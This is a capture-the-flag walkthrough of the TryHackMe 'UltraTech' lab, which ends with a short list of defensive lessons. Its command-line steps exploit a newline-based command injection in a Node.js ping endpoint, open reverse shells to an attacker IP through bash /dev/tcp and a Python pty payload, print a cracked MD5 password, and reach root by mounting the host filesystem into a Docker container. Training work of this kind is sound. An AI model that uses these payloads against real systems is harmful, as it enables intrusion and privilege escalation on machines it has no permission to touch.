<!-- frontmatter: {"title":"Ultratech","date":"2026-02-07","platform":"TryHackMe","category":"Web","difficulty":"Medium","tags":["rce","nodejs","docker","hashes","privesc"],"summary":"Command injection in a Node.js ping endpoint leads to shell access and Docker group escalation to root.","image":"/tryhackme/ultratech/crackstation.png"} -->

# UltraTech CTF

## Recon

### Nmap

```bash
nmap -sV -Pn -oN nmap.txt 10.10.211.245 -p21,22,8081,31331 -sC
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

---

## Web Enumeration

### ffuf

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.136.152:8081/FUZZ
auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 202ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 123ms]
```

### Endpoint behavior

Initial request:

```bash
curl 'http://10.10.216.51:8081/ping'
```

Response leaks stack trace:

```
TypeError: Cannot read property 'replace' of undefined
  at app.get (/home/www/api/index.js:45:29)
```

Inference: Express route does `req.query.<param>.replace(...)` then shells out to `ping`.

### Param discovery

```bash
curl 'http://10.10.216.51:8081/ping?ip=localhost'                       
PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.031 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
```

### Filter characteristics

- Testing basic commands injection technique such as semicolon `;` or pipe `|`, found out they are stripped
- **Backticks** and **newlines** survive

### Proof of RCE

```bash
curl -G 'http://10.10.211.245:8081/pingip=127.0.0.1%0Aid'                                                
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
uid=1002(www) gid=1002(www) groups=1002(www)
```

---

## Reverse Shell

```bash
curl 'http://10.10.211.245:8081/ping?ip=127.0.0.1%0Abash%20-c%20%22exec%20bash%20-i%20%3E/dev/tcp/10.23.99.212/4444%202%3E%261%20%3C%261%22'
```

```bash
nc -lvnp 4444
Connection from 10.10.211.245:54508
id
ls
```

This command worked but the shell was unstabble. A better reliability came from Python PTY.

```bash
curl -G 'http://10.10.211.245:8081/ping'   --data-urlencode $'ip=127.0.0.1`python - <<PY
import socket,os,pty
s=socket.socket()
s.connect(("10.23.99.212",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/bash")
PY
echo 127.0.0.1`'
```

```bash
nc -lvnp 4444
Connection from 10.10.211.245:39338
www@ip-10-10-211-245:~/api$ id
id
uid=1002(www) gid=1002(www) groups=1002(www)
```

---

## Linux Enumeration

### Interesting file: SQLite DB

```bash
ls
# utech.db.sqlite

strings utech.db.sqlite
# CREATE TABLE users (login Varchar, password Varchar, type Int)
# r00t  f357a0c52799563c7c7b76c1e7543a32
# admin 0d0ea5111e3c1def594c1684e3b9be84
```

### Crack hashes (raw MD5)

![](/tryhackme/ultratech/crackstation.png)
Using Crack station, we cracked `r00t` password

- `f357a0c52799563c7c7b76c1e7543a32` → **n100906**

`admin` password was also cracked.

### Valid local users

```bash
grep /bin/bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
r00t:x:1001:1001::/home/r00t:/bin/bash
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

### Switch user

Use `r00t : n100906` to move to an owned context:

```bash
# via shell on box (or SSH if permitted)
su - r00t
id
# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

---

## Privilege Escalation

```bash
r00t@ip-10-10-211-245:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Being in `docker` is root-equivalent. No need to pull images; host already has `bash:latest`.

### Method: bind-mount `/` and chroot

```bash
docker image ls -a
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB

docker run --rm -it -v /:/mnt --privileged bash:latest bash -lc 'chroot /mnt /bin/bash'

root@6896534b995b:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

---

## Lessons Learned

- Filters that delete a single metacharacter (`;`) are security theater; **command substitution** and **newlines** remain lethal.
- Any user in `docker` is effectively **root**; treat group assignment as a privileged operation.
- Hashes in app artifacts rapidly become credentials if they’re **unsalted MD5**.
- Deny detailed error pages to unauthenticated clients—stack traces map the code path to the bug.
